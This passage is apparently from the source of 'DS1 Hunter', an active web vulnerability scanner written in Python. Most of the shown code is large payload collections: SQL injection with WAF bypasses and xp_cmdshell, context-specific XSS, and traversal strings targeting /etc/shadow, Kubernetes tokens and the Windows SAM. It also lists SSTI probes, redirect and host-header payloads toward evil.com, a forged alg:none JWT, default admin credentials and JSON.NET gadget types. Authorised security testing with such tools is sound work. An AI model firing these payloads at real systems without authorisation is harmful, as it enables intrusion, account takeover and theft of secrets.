"""
DS1 Hunter - Active Scanner
DigitalSecurity1 - "Hunt. Chain. Prove."

Three-phase autonomous scanner:
  Phase 1: Crawl  - Playwright SPA crawler (falls back to aiohttp BFS)
  Phase 2: Fingerprint - detect tech stack from headers / body
  Phase 3: Probe  - per-endpoint active vulnerability checks

Checks:
  SQLi error-based + boolean-blind + time-blind (MySQL/PgSQL/MSSQL)
  XSS - reflected verbatim + contextual (HTML body/attr/JS/comment)
  DOM XSS - headless browser execution with dialog interception
  SSTI (math-eval canary, 5 engines)
  Path traversal
  Command injection (timing + error)
  Open redirect
  SSRF - URL parameter detection, cloud metadata probe
  XXE - file read + SSRF variant via XML POST
  Java deserialization - magic byte detection + error-based probe
  PHP object injection - unserialize() error detection
  Log4Shell / JNDI injection - header injection probes
  HTTP Request Smuggling - CL.TE and TE.CL timing (raw socket)
  GraphQL - introspection enabled + injection
  Mass assignment - privilege field injection on JSON APIs
  Web cache poisoning - unkeyed header reflection
  Prototype pollution - __proto__ and constructor injection
  Stored XSS - canary injection via forms + post-probe sweep of all crawled pages
  .NET deserialization - ViewState MAC bypass + JSON.NET TypeNameHandling
  WebSocket injection - WS endpoint detection + XSS/SQLi/CMDi payload injection
  Auth bypass headers
  CORS misconfiguration
  Security headers audit
  Sensitive file exposure
  Information disclosure
"""

import asyncio
import re
import socket
import threading
import time
import uuid
from html.parser import HTMLParser
from typing import Any, Dict, List, Optional, Set

try:
    from playwright.async_api import async_playwright as _pw
    _PLAYWRIGHT_OK = True
except Exception:
    _PLAYWRIGHT_OK = False
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import aiohttp
from core import scan_proxy
from core.session_store import save_session as _store_save, load_sessions as _store_load, delete_session as _store_delete
from core.accuracy import score_finding, is_likely_false_positive
from core.think_engine import _TECH_PAYLOAD_MAP

logger = __import__("logging").getLogger("ds1hunter.active_scanner")

_MODULE = "active_scan"

_sessions: Dict[str, Dict[str, Any]] = {}
_lock = threading.Lock()

# Load persisted sessions on startup (results survive server restart)
for _s in _store_load(_MODULE):
    _s.setdefault("oob_client", None)
    _s.setdefault("stored_xss_canaries", {})
    _s.setdefault("ws_endpoints", [])
    _sessions[_s["id"]] = _s


def _in_scope(netloc: str, scope: str) -> bool:
    """Accept www.X and X as equivalent scope hosts (handles www→non-www redirects)."""
    if netloc == scope:
        return True
    bare = lambda h: h[4:] if h.startswith('www.') else h
    return bare(netloc) == bare(scope)

# ── Re-use spider helpers ─────────────────────────────────────────────────────

class _LinkExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links: List[str] = []
        self.forms: List[Dict] = []
        self._cur_form: Optional[Dict] = None

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag in ('a', 'link'):
            if href := d.get('href', ''):
                self.links.append(href)
        elif tag in ('script', 'img', 'iframe', 'source'):
            if src := d.get('src', ''):
                self.links.append(src)
        elif tag == 'form':
            self._cur_form = {
                'action': d.get('action', ''),
                'method': d.get('method', 'get').upper(),
                'inputs': [],
            }
        elif tag == 'input' and self._cur_form is not None:
            name = d.get('name', '')
            input_type = d.get('type', 'text').lower()
            if name and input_type not in ('submit', 'button', 'image', 'reset', 'file'):
                self._cur_form['inputs'].append({
                    'name': name,
                    'type': input_type,
                    'value': d.get('value', ''),
                })
        elif tag == 'textarea' and self._cur_form is not None:
            name = d.get('name', '')
            if name:
                self._cur_form['inputs'].append({
                    'name': name,
                    'type': 'textarea',
                    'value': '',
                })
        elif tag == 'select' and self._cur_form is not None:
            name = d.get('name', '')
            if name:
                self._cur_form['inputs'].append({
                    'name': name,
                    'type': 'select',
                    'value': '',
                })

    def handle_endtag(self, tag):
        if tag == 'form' and self._cur_form is not None:
            self.forms.append(self._cur_form)
            self._cur_form = None


_JS_PATH_RE = re.compile(r'''["'`](\/[a-zA-Z0-9_\-/.?=&%#+@:]{2,})["'`]''')


def _links_from_html(html: str, base: str):
    ex = _LinkExtractor()
    try:
        ex.feed(html)
    except Exception:
        pass
    urls = []
    for href in ex.links:
        try:
            abs_url = urljoin(base, href)
            if abs_url.startswith(('http://', 'https://')):
                urls.append(abs_url)
        except Exception:
            pass
    forms = []
    for f in ex.forms:
        try:
            action = urljoin(base, f['action']) if f['action'] else base
            forms.append({**f, 'action': action})
        except Exception:
            pass
    return urls, forms


def _links_from_js(js: str, base: str) -> List[str]:
    out = []
    for m in _JS_PATH_RE.finditer(js):
        try:
            abs_url = urljoin(base, m.group(1))
            if abs_url.startswith(('http://', 'https://')):
                out.append(abs_url)
        except Exception:
            pass
    return out


# ── Fingerprinting data ───────────────────────────────────────────────────────

_TECH_SIGS = [
    # (category, name, header_or_body_pattern)
    ('Framework',  'Django',      re.compile(r'csrfmiddlewaretoken|django', re.I)),
    ('Framework',  'Laravel',     re.compile(r'laravel_session|X-Powered-By: PHP', re.I)),
    ('Framework',  'Rails',       re.compile(r'X-Request-Id.*Rails|_rails_session', re.I)),
    ('Framework',  'Express',     re.compile(r'X-Powered-By: Express', re.I)),
    ('Framework',  'Flask',       re.compile(r'Werkzeug|flask', re.I)),
    ('Framework',  'ASP.NET',     re.compile(r'ASP\.NET|__VIEWSTATE|X-AspNet-Version', re.I)),
    ('Framework',  'Spring',      re.compile(r'X-Application-Context|JSESSIONID', re.I)),
    ('Language',   'PHP',         re.compile(r'X-Powered-By: PHP|\.php', re.I)),
    ('Language',   'Java',        re.compile(r'JSESSIONID|\.jsp|\.do\b', re.I)),
    ('Language',   'Python',      re.compile(r'python|wsgiref', re.I)),
    ('Server',     'nginx',       re.compile(r'Server: nginx', re.I)),
    ('Server',     'Apache',      re.compile(r'Server: Apache', re.I)),
    ('Server',     'IIS',         re.compile(r'Server: Microsoft-IIS', re.I)),
    ('Server',     'Cloudflare',  re.compile(r'CF-Ray|Server: cloudflare', re.I)),
    ('CMS',        'WordPress',   re.compile(r'wp-content|wp-includes|WordPress', re.I)),
    ('CMS',        'Drupal',      re.compile(r'Drupal|drupal', re.I)),
    ('CMS',        'Joomla',      re.compile(r'Joomla|joomla', re.I)),
    ('CDN',        'AWS',         re.compile(r'AmazonS3|x-amz-', re.I)),
]

_SQLI_ERRORS = re.compile(
    r"SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
    r"sqlite3\.OperationalError|SQLSTATE|Unclosed quotation mark|"
    r"Warning.*mysql_|You have an error in your SQL syntax|"
    r"supplied argument is not a valid MySQL|ODBC SQL Server Driver",
    re.I,
)

_SENSITIVE_FILES = [
    '.env', '.env.local', '.env.production',
    '.git/config', '.git/HEAD',
    'config.php', 'config.yml', 'config.yaml',
    'wp-config.php', 'web.config',
    'database.yml', 'secrets.yml',
    'backup.sql', 'dump.sql', 'db.sql',
    'phpinfo.php',
    'server-status', 'server-info',
    'actuator/env', 'actuator/health', 'actuator/info',
    '.DS_Store',
    'robots.txt', 'sitemap.xml',
    'crossdomain.xml', 'clientaccesspolicy.xml',
]

_SEC_HEADERS = [
    'Content-Security-Policy',
    'Strict-Transport-Security',
    'X-Frame-Options',
    'X-Content-Type-Options',
    'Referrer-Policy',
    'Permissions-Policy',
]

_REDIRECT_PAYLOADS = [
    # Basic
    'https://evil.com',
    'http://evil.com',
    '//evil.com',
    '///evil.com',
    '////evil.com',
    '/\\evil.com',
    '\\/evil.com',
    # Protocol confusion
    'https:evil.com',
    'https:///evil.com',
    'javascript:alert(1)',
    'javascript://evil.com/%0aalert(1)',
    'data:text/html,<script>location="https://evil.com"</script>',
    # Whitespace bypass
    '\thttps://evil.com',
    '\nhttps://evil.com',
    '\rhttps://evil.com',
    ' https://evil.com',
    # Null byte / encoding
    'https://evil.com%00',
    'https://evil.com%00.trusted.com',
    'https://evil.com%2F%2F',
    '%2F%2Fevil.com',
    '%68%74%74%70%73%3a%2f%2fevil.com',   # hex encoded https://evil.com
    '%2Fevil.com',
    # Host confusion
    'https://evil.com#@trusted.com',
    'https://trusted.com@evil.com',
    'https://trusted.com.evil.com',
    'https://evil.com?trusted.com',
    # CRLF injection
    '\r\nLocation:https://evil.com',
    '\r\nLocation: https://evil.com',
    '%0d%0aLocation:https://evil.com',
    '%0d%0aLocation:%20https://evil.com',
    # IPv6 / loopback
    'http://[::1]/',
    'http://0/',
    'http://0.0.0.0/',
    # Double slash + scheme
    '///evil.com/%2F%2F',
    'https://%65vil.com',              # punycode-ish e → %65
    '//evil%2Ecom',
]

# HTTP verbs to try for verb tampering
_HTTP_VERBS = ['POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']

# Common redirect/return URL parameter names - probed even when not in original URL
_REDIRECT_PARAM_NAMES = [
    'next', 'redirect', 'redirect_uri', 'return', 'returnTo',
    'goto', 'url', 'target', 'dest', 'callback', 'forward', 'continue',
]

# Common path-based redirect endpoint prefixes
_REDIRECT_PATH_PREFIXES = [
    '/redirect/', '/go/', '/out/', '/exit/', '/link/', '/redir/',
    '/external/', '/url/', '/jump/', '/track/', '/click/', '/forward/',
]

# Payloads that upgrade severity to critical
_CRITICAL_REDIRECT_PREFIXES = ('javascript:', 'data:', 'vbscript:')

# Regex for meta-refresh redirect containing external URL
_META_REFRESH_RE = re.compile(
    r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*url\s*=\s*(https?://[^\s"\'>;]+|//[^\s"\'>;]+)',
    re.I,
)
# Regex for JS redirect to external URL
_JS_REDIRECT_RE = re.compile(
    r'(?:window\.location|location\.href|location\.replace|location\.assign)\s*[=(]\s*["\']((https?:)?//[^\s"\']+)',
    re.I,
)

# CSRF token field names (their absence in POST forms = finding)
_CSRF_FIELD_NAMES = {
    'csrfmiddlewaretoken', 'csrf_token', '_csrf', '_csrf_token',
    'csrf', 'authenticity_token', '__requestverificationtoken',
    'x-csrf-token', '_token', 'csrftoken', 'anti_csrf',
    'xsrf_token', '_xsrf', 'request_forgery_protection_token',
}

# Host header injection payloads → attacker-controlled domain
_HOST_INJECTION_VALUES = [
    'evil.com',
    'evil.com:443',
    'evil.com:80',
    'evil.com%0d%0aX-Injected: header',
    'evil.com\r\nX-Injected: header',
    'attacker.com',
    '127.0.0.1',
    'localhost',
    '169.254.169.254',      # AWS metadata SSRF via host header
    '::1',
]

# Common JSON body parameter names to probe when we detect a JSON API
_JSON_PROBE_PARAMS = [
    'id', 'user_id', 'userId', 'username', 'email', 'search', 'query',
    'q', 'name', 'value', 'data', 'input', 'text', 'message', 'content',
    'url', 'redirect', 'return', 'next', 'callback', 'file', 'path',
    'token', 'key', 'code', 'ref', 'page', 'limit', 'offset', 'sort',
    'filter', 'order', 'type', 'action', 'cmd', 'command', 'exec',
]

_AUTH_BYPASS_HEADERS = [
    {},
    # IP spoofing - loopback as trusted internal
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'},
    {'CF-Connecting-IP': '127.0.0.1'},
    {'Forwarded': 'for=127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    # Path override headers
    {'X-Original-URL': '/admin'},
    {'X-Rewrite-URL': '/admin'},
    {'X-Override-URL': '/admin'},
    {'X-Original-URL': '/admin/dashboard'},
    # Broken bearer tokens
    {'Authorization': 'Bearer null'},
    {'Authorization': 'Bearer undefined'},
    {'Authorization': 'Bearer '},
    # JWT alg:none forged token (sub=admin, role=admin)
    {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'},
    # Basic auth with common credentials
    {'Authorization': 'Basic YWRtaW46YWRtaW4='},        # admin:admin
    {'Authorization': 'Basic YWRtaW46cGFzc3dvcmQ='},    # admin:password
    {'Authorization': 'Basic cm9vdDp0b29y'},             # root:toor
    # Custom admin flags
    {'X-Auth-Token': 'admin'},
    {'X-Admin': 'true'},
    {'X-Role': 'admin'},
    {'X-Forwarded-Host': 'localhost'},
]

_SSTI_PAYLOADS = {
    # ── Jinja2 / Twig ─────────────────────────────────────────────────────────
    '{{7*7}}':                                        '49',
    "{{7*'7'}}":                                      '7777777',
    '{{config}}':                                     'SECRET',
    '{{self.__dict__}}':                              '__dict__',
    '{{"".class.mro}}':                               'object',
    # ── Freemarker ────────────────────────────────────────────────────────────
    '${7*7}':                                         '49',
    '${"freemarker".toUpperCase()}':                  'FREEMARKER',
    '<#assign x=7*7>${x}':                            '49',
    '<#list 0..6 as i>${i}</#list>':                  '0123456',
    # ── Thymeleaf ─────────────────────────────────────────────────────────────
    '[[${7*7}]]':                                     '49',
    '__${7*7}__':                                     '49',
    '[[${"th:text"}]]':                               'th:text',
    # ── Spring SpEL ───────────────────────────────────────────────────────────
    '*{7*7}':                                         '49',
    '${T(java.lang.Runtime).getRuntime()}':           'Runtime',
    '${T(java.lang.Math).PI}':                        '3.14',
    # ── Velocity ──────────────────────────────────────────────────────────────
    '#set($x=7*7)$x':                                 '49',
    '#set($s="ds1")$s':                               'ds1',
    '${7*7}##':                                       '49',
    # ── Ruby ERB / Slim ───────────────────────────────────────────────────────
    '<%= 7*7 %>':                                     '49',
    '<%= "ds1hunter" %>':                             'ds1hunter',
    # ── Smarty ────────────────────────────────────────────────────────────────
    '{7*7}':                                          '49',
    '{math equation="7*7"}':                          '49',
    '{assign var="x" value=49}{$x}':                  '49',
    # ── Pug / Jade ────────────────────────────────────────────────────────────
    '#{7*7}':                                         '49',
    'p= 7*7':                                         '49',
    # ── Handlebars ────────────────────────────────────────────────────────────
    '{{#with "s" as |string|}}':                      'string',
    '{{lookup . "constructor"}}':                     'function',
    # ── Nunjucks / Liquid ─────────────────────────────────────────────────────
    '{{ 7 * 7 }}':                                    '49',
    '{% set x = 7*7 %}{{ x }}':                      '49',
    # ── Mako ──────────────────────────────────────────────────────────────────
    '${7*7}':                                         '49',
    '<%=7*7%>':                                       '49',
    # ── Go html/template ─────────────────────────────────────────────────────
    '{{.}}':                                          'map',
    # ── Razor / .NET ──────────────────────────────────────────────────────────
    '@(7+7)':                                         '14',
    '@{var x=7; @(x*7)}':                            '49',
    # ── EJS ───────────────────────────────────────────────────────────────────
    '<%-7*7%>':                                       '49',
    '<%=7*7%>':                                       '49',
    # ── Dot.js ────────────────────────────────────────────────────────────────
    '{{=7*7}}':                                       '49',
    # ── CSTI: AngularJS (client-side) ────────────────────────────────────────
    '{{constructor.constructor("alert(1)")()}}':      'csti',
    '{{$on.constructor("alert(1)")()}}':              'csti',
    '{{7*7|limitTo:1}}':                              '7',
    # ── CSTI: Vue.js ─────────────────────────────────────────────────────────
    '{{_c}}':                                         'function',
    '{{$mount}}':                                     'function',
}

_TRAVERSAL_PAYLOADS = [
    # ── Classic depth ─────────────────────────────────────────────────────────
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    # ── URL-encoded ───────────────────────────────────────────────────────────
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    # ── Double-encoded ────────────────────────────────────────────────────────
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '..%255c..%255c..%255cwindows%255cwin.ini',
    # ── Triple-encoded ────────────────────────────────────────────────────────
    '..%25252F..%25252F..%25252Fetc%25252Fpasswd',
    # ── Slash confusion ───────────────────────────────────────────────────────
    '....//....//....//etc/passwd',
    '..././..././..././etc/passwd',
    '..//../..//etc/passwd',
    '.%2e/.%2e/.%2e/etc/passwd',
    # ── Overlong UTF-8 bypass ─────────────────────────────────────────────────
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
    '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
    # ── Null byte (PHP / legacy CGI) ─────────────────────────────────────────
    '../../../etc/passwd%00',
    '../../../etc/passwd%00.jpg',
    '../../../etc/passwd%00.png',
    '../../../etc/passwd\x00',
    # ── Windows backslash ─────────────────────────────────────────────────────
    '..\\..\\..\\windows\\win.ini',
    '..%5C..%5C..%5Cwindows%5Cwin.ini',
    '..%5c..%5c..%5cwindows%5cwin.ini',
    '..\\..\\.\\windows\\system32\\drivers\\etc\\hosts',
    # ── Absolute Linux paths ─────────────────────────────────────────────────
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/hostname',
    '/etc/issue',
    '/etc/os-release',
    '/proc/self/environ',
    '/proc/self/cmdline',
    '/proc/self/maps',
    '/proc/self/status',
    '/proc/version',
    '/proc/net/tcp',
    '/proc/net/fib_trie',
    # ── Docker / container ────────────────────────────────────────────────────
    '/etc/docker/key.json',
    '/proc/1/cgroup',
    '/.dockerenv',
    '/run/secrets/kubernetes.io/serviceaccount/token',
    '/var/run/secrets/kubernetes.io/serviceaccount/token',
    # ── Log poisoning targets ────────────────────────────────────────────────
    '/var/log/apache2/access.log',
    '/var/log/nginx/access.log',
    '/var/log/auth.log',
    '/var/log/mail.log',
    '/var/log/vsftpd.log',
    # ── PHP stream wrappers ───────────────────────────────────────────────────
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'php://filter/read=convert.base64-encode/resource=/etc/passwd',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://input',
    'data://text/plain;base64,dGVzdA==',
    'expect://id',
    'file:///etc/passwd',
    # ── Windows absolute ─────────────────────────────────────────────────────
    'C:\\Windows\\win.ini',
    'C:/Windows/System32/drivers/etc/hosts',
    'C:/inetpub/wwwroot/web.config',
    'C:/Windows/System32/config/SAM',
    '/windows/win.ini',
    # ── Filter bypass: mixed case / extra dots ────────────────────────────────
    '....%2F....%2Fetc%2Fpasswd',
    '%2e%2e%5cetc%5cpasswd',
    '/%5C../%5C../etc/passwd',
    # ── ZIP slip targets (for archive-based traversal) ────────────────────────
    '../../../tmp/evil.sh',
    '../../../../../../var/www/html/shell.php',
]

_TRAVERSAL_SIG = re.compile(r'root:[x*]:0:0', re.I)

# ── WebSocket URL extraction ───────────────────────────────────────────────────
_WS_URL_RE = re.compile(r'''["'](wss?://[^"'<>\s]{4,200})["']''', re.I)

# ── .NET deserialization ──────────────────────────────────────────────────────
_DOTNET_DESER_ERRORS = re.compile(
    r'System\.Runtime\.Serialization|BinaryFormatter|TypeNameHandling|'
    r'ObjectDataProvider|JsonSerializationException|InvalidCastException|'
    r'MachineKeySection|Validation of viewstate MAC failed|'
    r'TargetInvocationException|SerializationException|'
    r'viewstate.*mac|mac.*failed',
    re.I,
)
_JSONNET_PAYLOADS = [
    '{"$type":"System.Net.WebClient, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}',
    '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0"}',
    '{"__type":"System.Object"}',
]

_XSS_CANARY_PREFIX = 'ds1xss'
_SQLI_PAYLOADS = [
    # ── Quote triggers ────────────────────────────────────────────────────────
    "'", '"', '`', "''", "\\", "\\\\",
    # ── Auth bypass ───────────────────────────────────────────────────────────
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "')) OR (('x'='x",
    # ── Boolean context ───────────────────────────────────────────────────────
    "1 AND 1=1--",
    "1 AND 1=2--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1 AND 1=1#",
    "1 AND 1=2#",
    "1' AND '1'='1",
    "1' AND '1'='2",
    # ── Stacked / UNION init ─────────────────────────────────────────────────
    "1;SELECT 1--",
    "'; SELECT 1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "1 UNION ALL SELECT NULL--",
    "1 UNION ALL SELECT NULL,NULL--",
    # ── Error-based: MySQL ────────────────────────────────────────────────────
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' AND exp(~(SELECT*FROM(SELECT version())x))--",
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # ── Error-based: PostgreSQL ───────────────────────────────────────────────
    "' AND 1=CAST((SELECT version()) AS INT)--",
    "' AND 1=CAST((SELECT current_user) AS INT)--",
    "'||(SELECT pg_sleep(0))||'",
    "' AND 1=(SELECT 1 FROM pg_sleep(0))--",
    # ── Error-based: MSSQL ────────────────────────────────────────────────────
    "' AND 1=CONVERT(int,@@version)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; EXEC xp_cmdshell('ping -n 1 127.0.0.1')--",
    "'; EXEC sp_configure 'show advanced options',1--",
    # ── Error-based: Oracle ───────────────────────────────────────────────────
    "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' UNION SELECT NULL FROM DUAL--",
    "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
    # ── Error-based: SQLite ───────────────────────────────────────────────────
    "' AND 1=CAST(sqlite_version() AS INTEGER)--",
    "' UNION SELECT sqlite_version()--",
    # ── WAF bypass: comment injection ────────────────────────────────────────
    "'/**/OR/**/'1'='1",
    "' /*!OR*/ '1'='1",
    "'%09OR%091=1--",
    "'%0aOR%0a1=1--",
    "' OR%001=1--",
    "'%20OR%201=1--",
    # ── WAF bypass: case variation ────────────────────────────────────────────
    "' oR '1'='1",
    "' Or '1'='1",
    "' uNiOn SeLeCt NULL--",
    "' UnIoN sElEcT NULL--",
    # ── WAF bypass: encoding ─────────────────────────────────────────────────
    "%27 OR 1=1--",
    "%27%20OR%201%3D1--",
    "\x27 OR 1=1--",
    # ── JSON SQLi ────────────────────────────────────────────────────────────
    '{"user":"admin\\'--","pass":"x"}',
    '{"id":"1 OR 1=1--"}',
    # ── Time-based init ───────────────────────────────────────────────────────
    "' AND SLEEP(1)--",
    "' AND pg_sleep(1)--",
    "'; WAITFOR DELAY '0:0:1'--",
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',1) IS NULL--",
    # ── Second-order canary ──────────────────────────────────────────────────
    "ds1sqli'--",
    "ds1sqli\"--",
]

# ── Blind SQLi ────────────────────────────────────────────────────────────────

_BOOL_TRUE = [
    "' AND '1'='1'--",
    '" AND "1"="1"--',
    "1 AND 1=1--",
    "1' AND 1=1--",
    "' AND 1=1",
    "' AND 'ds1'='ds1",
    "' AND IF(1=1,1,0)--",                             # MySQL
    "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1--",       # PostgreSQL
    "' AND IIF(1=1,1,0)=1--",                           # MSSQL
    "' AND 1&1=1--",
]
_BOOL_FALSE = [
    "' AND '1'='2'--",
    '" AND "1"="2"--',
    "1 AND 1=2--",
    "1' AND 1=2--",
    "' AND 1=2",
    "' AND 'ds1'='ds2",
    "' AND IF(1=2,1,0)--",
    "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1--",
    "' AND IIF(1=2,1,0)=1--",
    "' AND 1&2=1--",
]

_TIME_PAYLOADS = [
    # One reliable payload per DB engine — exit immediately on first hit.
    ("' AND SLEEP(5)--",                                                  "MySQL"),
    ("' OR SLEEP(5)--",                                                   "MySQL-OR"),
    ("1 AND SLEEP(5)--",                                                  "MySQL-int"),
    ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",                       "MySQL-subq"),
    ("' AND SLEEP(5)#",                                                   "MySQL-hash"),
    ("' AND pg_sleep(5)--",                                               "PostgreSQL"),
    ("1 AND (SELECT 1 FROM pg_sleep(5))--",                               "PostgreSQL-int"),
    ("' OR pg_sleep(5)--",                                                "PostgreSQL-OR"),
    ("'; WAITFOR DELAY '0:0:5'--",                                        "MSSQL"),
    ("1; WAITFOR DELAY '0:0:5'--",                                        "MSSQL-int"),
    ("' OR WAITFOR DELAY '0:0:5'--",                                      "MSSQL-OR"),
    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NULL--",                  "Oracle"),
    ("' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NULL--",           "Oracle-OR"),
    ("' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NULL)--", "Oracle-sub"),
    ("' AND randomblob(200000000)--",                                     "SQLite"),
    ("1 AND randomblob(200000000)--",                                     "SQLite-int"),
    ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",     "SQLite-like"),
]

# ── Contextual XSS ────────────────────────────────────────────────────────────

# Payloads keyed by context; {canary} substituted at runtime
_XSS_CTX_PAYLOADS = {
    'html': [
        # ── Core HTML ────────────────────────────────────────────────────────
        '<script>alert("{canary}")</script>',
        '<img src=x onerror=alert("{canary}")>',
        '<svg onload=alert("{canary}")>',
        '<body onload=alert("{canary}")>',
        '<details open ontoggle=alert("{canary}")>',
        '<input autofocus onfocus=alert("{canary}")>',
        '<video src=x onerror=alert("{canary}")>',
        '<audio src=x onerror=alert("{canary}")>',
        '<iframe onload=alert("{canary}")></iframe>',
        '<object data="javascript:alert(\'{canary}\')">',
        '<embed src="javascript:alert(\'{canary}\')">',
        '<form action="javascript:alert(\'{canary}\')"><input type=submit>',
        # ── SVG / MathML ─────────────────────────────────────────────────────
        '<svg><animate onbegin=alert("{canary}") attributeName=x dur=1s>',
        '<svg><set attributeName=href from=# to=javascript:alert("{canary}") begin=0s>',
        '<svg><use href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><script>alert(\'{canary}\')</script></svg>#x">',
        '<math><maction actiontype="statusline#http://x" xlink:href="javascript:alert({canary})">click</maction></math>',
        '<math href="javascript:alert(\'{canary}\')">CLICK</math>',
        # ── Filter break-out ─────────────────────────────────────────────────
        '"><script>alert("{canary}")</script>',
        "'><img src=x onerror=alert('{canary}')>",
        '><svg onload=alert("{canary}")>',
        '</tag><script>alert("{canary}")</script>',
        '<noscript><p title="</noscript><img src=x onerror=alert(\'{canary}\')>">',
        # ── Event diversity ───────────────────────────────────────────────────
        '<div onmouseenter=alert("{canary}")>hover</div>',
        '<marquee onstart=alert("{canary}")>',
        '<select onfocus=alert("{canary}") autofocus>',
        '<textarea onfocus=alert("{canary}") autofocus>',
        '<keygen onfocus=alert("{canary}") autofocus>',
        '<isindex type=image src=1 onerror=alert("{canary}")>',
        # ── Mutation XSS (mXSS) ───────────────────────────────────────────────
        '<img src="x:x" onerror=alert("{canary}")>',
        '<img src=`x` onerror=alert("{canary}")>',
        '<IMG SRC=# onmouseover=alert("{canary}")>',
        '<SCRIPT>alert("{canary}")</SCRIPT>',
        '<ScRiPt>alert("{canary}")</ScRiPt>',
        # ── CSS-based ─────────────────────────────────────────────────────────
        '<style>@keyframes x{}</style><xss style=animation-name:x onanimationend=alert("{canary}")>',
        '<x style="behavior:url(#ds1)" onmouseover=alert("{canary}")>',
    ],
    'attr_dq': [
        '" onmouseover="alert(\'{canary}\')" x="',
        '" autofocus onfocus="alert(\'{canary}\')" x="',
        '" onclick="alert(\'{canary}\')" x="',
        '" onerror="alert(\'{canary}\')" x="',
        '" onkeydown="alert(\'{canary}\')" x="',
        '" ondblclick="alert(\'{canary}\')" x="',
        '" onpointerover="alert(\'{canary}\')" x="',
        '" style="animation-name:rotation" onanimationstart="alert(\'{canary}\')" x="',
        '" onmouseenter="alert(\'{canary}\')" x="',
        '" onmouseleave="alert(\'{canary}\')" x="',
        '" oncontextmenu="alert(\'{canary}\')" x="',
        '" ontouchstart="alert(\'{canary}\')" x="',
        '" onwheel="alert(\'{canary}\')" x="',
        '" oncopy="alert(\'{canary}\')" x="',
        '" oncut="alert(\'{canary}\')" x="',
        '" onpaste="alert(\'{canary}\')" x="',
    ],
    'attr_sq': [
        "' onmouseover='alert(\"{canary}\")' x='",
        "' autofocus onfocus='alert(\"{canary}\")' x='",
        "' onclick='alert(\"{canary}\")' x='",
        "' onerror='alert(\"{canary}\")' x='",
        "' ondblclick='alert(\"{canary}\")' x='",
        "' onpointerover='alert(\"{canary}\")' x='",
        "' onmouseenter='alert(\"{canary}\")' x='",
        "' oncontextmenu='alert(\"{canary}\")' x='",
    ],
    'attr_unq': [
        ' onmouseover=alert`{canary}` x=',
        ' onfocus=alert`{canary}` autofocus x=',
        ' onclick=alert`{canary}` x=',
        ' onpointerover=alert`{canary}` x=',
        ' onmouseenter=alert`{canary}` x=',
        ' onerror=alert`{canary}` x=',
    ],
    'js_dq': [
        '"-alert("{canary}")-"',
        '\\";alert("{canary}");//',
        '"+alert("{canary}")//"',
        '";alert("{canary}");//',
        '"-confirm("{canary}")-"',
        '"-prompt("{canary}")-"',
        '\\x22;alert("{canary}");//',
        '\\u0022;alert("{canary}");//',
        '</script><script>alert("{canary}")</script>',
    ],
    'js_sq': [
        "'-alert('{canary}')-'",
        "\\';alert('{canary}');//",
        "'+alert('{canary}')//'",
        "';alert('{canary}');//",
        "\\x27;alert('{canary}');//",
        "\\u0027;alert('{canary}');//",
    ],
    'js_tpl': [
        '`${alert("{canary}")}',
        '}-alert("{canary}")-`',
